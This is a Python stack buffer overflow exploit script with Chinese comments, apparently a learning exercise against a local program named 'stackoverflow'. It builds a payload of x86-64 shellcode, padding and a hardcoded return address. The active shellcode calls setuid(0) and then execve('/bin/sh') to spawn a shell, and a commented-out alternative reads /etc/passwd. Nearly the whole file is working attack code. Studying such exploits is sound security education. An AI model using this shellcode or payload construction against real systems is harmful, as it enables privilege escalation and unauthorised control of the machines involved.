# -*- coding:utf8 -*-
#exp.py 
#!/usr/bin/env python
import struct
from subprocess import call

#返回地址（也是缓冲区的在内存中首地址）
#缓冲区的中存放了我们要执行的代码（shellcode）
#以及填充满的无用字符'A'

ret_addr =  "\x7f\xff\xff\xff\xdf\xd0"
               
#shellcode 1
#cat /etc/password
#反汇编得到的机器码
#shellcode = "\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41"

#shellcode 2
#execve("/bin/sh",NULL,NULL);
#反汇编得到的机器码
shellcode = "\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
#打印shellcode的长度，单位字节
print("shellcode byte:%d")%len(shellcode)

#linux中的数据存储是小端模式
#将返回地址转小端模式
#endianess convertion
def conv(num):
	#return struct.pack("<Q", num)#nk + RA + NOP's + Shellcode
	return num[::-1]

#old code not use
#buf = "A" * 18
#buf += conv(ret_addr)
#buf += "\x90" * 100
#buf += shellcode
#print(buf)


#堆栈内容 = 264字节 + 返回地址
#264字节 = 256字节（缓冲区大小） + 8字节（基地址，64位机是8字节，32位机是4字节）
#构造buf
#buf =  shellcode + 填充字节(264-shellcode的长度) + 返回地址
buf =  shellcode
buf +=  "A" * (264 - len(shellcode))
buf += conv(ret_addr)

#调用编译好的程序stackoverflow,并传入构造好的参数
#让程序按照我们的意愿执行我们的shellcode
call(["./stackoverflow",  buf])
